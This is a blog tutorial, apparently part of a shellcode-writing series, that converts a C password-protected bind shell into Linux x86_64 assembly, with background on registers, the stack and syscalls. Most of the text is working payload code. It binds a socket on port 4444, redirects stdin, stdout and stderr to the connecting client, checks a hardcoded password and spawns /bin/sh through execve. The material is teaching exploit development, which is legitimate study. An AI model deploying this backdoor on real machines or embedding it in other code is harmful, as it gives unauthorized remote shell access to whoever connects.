---
title: "Implementing a password protected bind shell in shellcode - Part 2"
categories:
  - blog
---

Now that we have the finalized code in C, we can begin the process of "converting" the code to Linux 64-bit Assembly code. The reason that we first wrote the program in C should become apparent as we go through the process.

<h3>Background</h3>

We need to do a little bit of homework before we can just jump into coding in Assembly and I will try my best to explain the needed background on the workings of Assembly, syscalls, registers and the stack.

<h2>What is Assembly?</h2>

Assembly is, in very basic terms, a low level programming language and is as close as you can get to actual machine language. Every type of computer architecture or even operating system will have its own assembly language due to the differences in instructions, registers and how it uses the stack. This blog specifically focuses on Linux x86_64 assembly.

<h2>What are Registers?</h2>

Registers are temporary storage areas that are built into the CPU. Registers can be used to store data, move data to and from other registers or move data to and from memory etc. The registers that we will working with primarily is:

<ul>
  <li>RAX</li>
  <li>RBX</li>
  <li>RCX</li>
  <li>RDX</li>
  <li>RSI</li>
  <li>RDI</li>
  <li>RSP</li>
</ul>

There are other registers to, R8 - R15 for instance, but we will not be working with these so much.

It is also important to understand the structure of a register, especially when working with 64 bit registers. The reason why will become clearer when we reach the last phase of our process for generating shellcode. The important thing to remember is that a register can be broken up into smaller parts/bytes and based on this distinction, the name of the register changes. If we use 'rax' in our Assembly code then we will be referring to the full 64-bit register and if we use 'eax' in our Assembly code, we will be referring to only the lower 32 byte part of it. The below table should clarify the last statement:

<table style="width:100%">
  <tr>
    <th>64-bit Register</th>
    <th>Lower 32 bits</th>
    <th>Lower 16 bits</th>
    <th>Lower 8 bits</th>
  </tr>
  <tr>
    <td>rax</td>
    <td>eax</td>
    <td>ax</td>
    <td>al</td>
  </tr>
  <tr>
    <td>rsi</td>
    <td>esi</td>
    <td>si</td>
    <td>sil</td>
  </tr>
</table>

<h2>What is the stack?</h2>

The stack a temporary storage location for use with common operations. The most important attribute of the stack you need to know of is that it is LIFO (Last In First Out) and it grows from high memory to low memory. You can think of the stack as a stack of trays in a cafeteria where the last tray that was put on the top of the tray stack will be the one that the next customer takes off the stack to dish up. The register that keeps track of the stack is the RSP (Stack Pointer) Register.

<h2>What are syscalls?</h2>

If you can recall from Part 1, syscalls are System Calls that are used to make requests from the user space into the Linux Kernel. Each syscall has a permanent number assigned to it so that the linux kernel knows what you are trying to do when it receives the instruction. The full list of all syscalls and their associate numbers can be found [here](https://filippo.io/linux-syscall-table/). The syscall numbers that we used in our C program are as follows:

```c++
read == 0
socket == 41
bind == 49
listen == 50
accept == 43
close == 3
dup2 == 33
execve == 59
exit == 60
```


So how do we use syscalls with Assembly code? Well, syscalls have a set structure in machine language terms. Specific registers are used for specific arguments and then the 'syscall' instruction is then given that will pass all the arguments in said registers. Below are the registers and what they are used for:

```c++
RAX -> system call number
RDI -> first argument
RSI -> second argument
RDX -> third argument
```

Let's take our first stage code from Part 1 as an example to clarify further.

```c++
sock = socket(AF_INET, SOCK_STREAM, 0);
```

So from what we now know, if we wanted to write corresponding Assembly code for this C code then we will have to assign 41 (socket syscall number) to RAX, AF_INET to RDI, SOCK_STREAM to RSI and 0 to RDX and finally provide the 'syscall' instruction. One more thing to remember is that the return value of the syscall instruction is stored in the RAX register. We will be doing this quite a few times in the actual code so you have a few more chances to understand if this is still confusing.

You can read up a bit further on how this works [here](https://www.cs.fsu.edu/~langley/CNT5605/2017-Summer/assembly-example/assembly.html).

That about does it for the background knowledge. Let's get started with coding in Assembly.

<h2>Writing a password protected bind shell in 64-bit Assembly</h2>

Now that we are ready to start the actual Assembly code, let's create the skeleton for our program and define the different areas of code we will be using:

```nasm
global _start


_start:

exit:

```
<h3>Stage 1 - Creating a socket</h3>

```c++
sock = socket(AF_INET, SOCK_STREAM, 0)
```

We have pretty much already finished this part of the code in our example above, but we still need to figure out how to pass arguments like AF_INET into assembly. Syscall arguments like these have a pre-defined constant assigned to them just like syscalls do. An easy way for us to find out what these values are, is to use python to do this work for us. Have a look at the following:

```python
Python 2.7.15+ (default, Jul  9 2019, 16:51:35)
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
 >>> import socket
 >>> socket.AF_INET
 2
 >>> socket.SOCK_STREAM
 1
```

From the python output above, we can see that the value for AF_INET needs to be 2 and the value for SOCK_STREAM needs to be 1. So lets put together our first block of assembly code.

```nasm
mov rax, 41 ;Syscall number for socket
mov rdi, 2 ;Value for AF_INET
mov rsi, 1 ;Value for SOCK_STREAM
mov rdx, 0 ;Third argument where we need to pass a 0
syscall //Give the syscall instruction
```

If the above code block does not make sense, please review the "What are syscalls section".

<h3>Stage 2 - Binding the newly created socket to a port</h3>

So remember that the return value from a syscall instruction will be saved in RAX and most of the subsequent instructions require "sock" as the first argument. So for this purpose, we will move the value inside RAX to RDI for use as the first argument in later syscall instructions.

```nasm
mov rdi, rax
```

Next up is setting up the Data Structure that we need for the bind syscall. We will make use of the Stack for this and remember that the Stack is LIFO, so we need to start with the last argument first. We do need to figure out what to pass as arguments for INADDR_ANY and the port to bind to. We need to hardcode the port in this case as there is no opportunity to pass arguments to your shellcode. So once again Python to the rescue.

```python
Python 2.7.15+ (default, Jul  9 2019, 16:51:35)
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import socket
>>> socket.INADDR_ANY
0
>>> socket.htons(4444)
23569 # value of 4444 in byte order
>>> hex(socket.htons(4444))
'0x5c11' 
>>>
```

So it seems that we need to pass 0 for INADDR_ANY and the hex value of the byte order of port 4444 is 0x5c11.

```c
server.sin_family = AF_INET;
server.sin_port = htons(atoi(arguments[2]));
server.sin_addr.s_addr = INADDR_ANY;
bzero(&server.sin_zero, 8);
```

```nasm
xor rax, rax ;zero out the rax register

push rax ;push the 8 zero bytes, in rax, to the stack for bzero
mov dword [rsp-4], eax ; move 4 bytes (because eax is the 32-bit part of rax) of 0's onto the stack (INADDR_ANY = int 0) at stack pointer - 4 bytes
mov word [rsp-6], 0x5c11 ; move the port value onto the stack - 2 bytes
mov word [rsp-8], 0x2 ;move the value 2 (for AF_INET) on the stack at stack pointer - 8 bytes
sub rsp, 8 ;adjust the stack pointer by 8 bytes for the above 3 commands so that RSP points to the beginning of our Data Structure
```

```c 
bind(sock, (struct sockaddr *)&server, sockaddr_len);
```

Ok, now that RSP is pointing to our constructed Data Structure, let's write the syscall instructions.

```nasm
mov rax, 49 ;syscall number for bind
mov rsi, rsp ;mov rsp (pointer to our data structure) into rsi as second argument. Remember rdi is already set with the first argument
mov rdx, 16 ; mov 16 into rdx for sockaddr_len. 8 zero bytes + 4 bytes INADDR_ANY + 2 bytes port + 2 bytes AF_INET = 16 bytes
syscall ;syscall bind instruction
```


<h3>Stage 3 - Listen for incoming connections on the newly created socket</h3>

Our listen syscall is straight forward.

```c
listen(sock, 2);
```

```nasm
mov rax, 50 ;syscall number for listen
mov rsi, 2 ;move value of 2 into rsi for second argument.
syscall ;syscall listen instruction
```

<h3>Stage 4 - Wait for incoming connections on the newly created socket</h3>

```c
new_sock = accept(sock, (struct sockaddr *)&client, &sockaddr_len);
close(sock);
```

For the client sockaddr Data Strucute we only need to reserve space on the stack to hold the client data as accept will populate the information for us. After we have our "new_sock", return value of the accept syscall stored in rax, we need to also close the original socket.

```nasm
mov rax, 43 ;syscall number for accept
sub rsp, 16 ;move the stack pointer 16 bytes for client Data Structure
mov rsi, rsp ;move the stack pointer to rsi as third argument 
mov byte [rsp-1], 16 ;move the value 16 onto the stack for sockaddr_len
sub rsp, 1 ;adjust the stack pointer to point to the value 16
mov rdx, rsp ;store rsp in rdx as third argument
syscall ;syscall accept instruction
        
mov r9, rax ;store "new_sock" in a safe place to use later

mov rax, 3 ;syscall number for close
syscall ;syscall close instruction
```

<h3>Stage 5 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>

This one is straight forward again, we just need to use dup2 three times for mapping the shell capabilities. You should be able to do these three by yourself now so no explanations in the code this time. The only thing to remember is that we have stored our "new_sock" file descriptor in r9, so we will just move that into rdi for the first syscall and then keep it there for the subsequent two dup2 syscalls.

```c
dup2(new_sock, 0);
dup2(new_sock, 1);
dup2(new_sock, 2);
```

```nasm
mov rax, 33
mov rdi, r9
mov rsi, 0
syscall

mov rax, 33
mov rsi, 1
syscall

mov rax, 33
mov rsi, 2
syscall
```

<h3>Stage 6 - Wait for input (password) to be received and compare it against the correct password string</h3>

For this step, we will define a password and then load that password into a register and compare the string with whatever is passed back from the incoming connection. We define the password with "db" or data byte so as to allocate some space, and fill it with a string. We will fetch this string using the RIP Relative Addressing method only available in 64-bit Assembly. Relative addressing will compute the address of the pass variable relative to the RIP (instruction pointer) and we can then just load this variable by using the 'rel pass' notation. 

```c
read(new_sock, buf, 16);
buf[strcspn(buf, "\n")] = 0;
if (strcmp(arguments[3], buf) == 0)
{
}
```

```nasm
xor rax, rax ;zero out rax - read syscall number = 0
push r10 ;push 8 bytes to the stack for 16 byte password support
mov rsi, rsp ;move the stack pointer to the 16 bytes into rsi for second argument 
mov rdx, 16 ;move the value 16 into rdx as third argument
syscall ;syscall read instruction

mov rax, [rel pass] ;load password variable into rax
mov rdi, rsi ;load the 8 bytes received from the client into rdi
scasq ;scasq will compare rax with rdi 
jne exit

; change as needed
pass: db "8bytesss" ;define a password
```

<h3>Stage 7 - Spawn the shell, if password is correct</h3>

```c
execve(arguments[0], &arguments[0], NULL);
```

```nasm
        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx

        mov rdi, rsp

        push rax

        mov rdx, rsp

        push rdi
        mov rsi, rsp
        mov rax, 59
        syscall

exit:
        mov rax, 60
        syscall
```
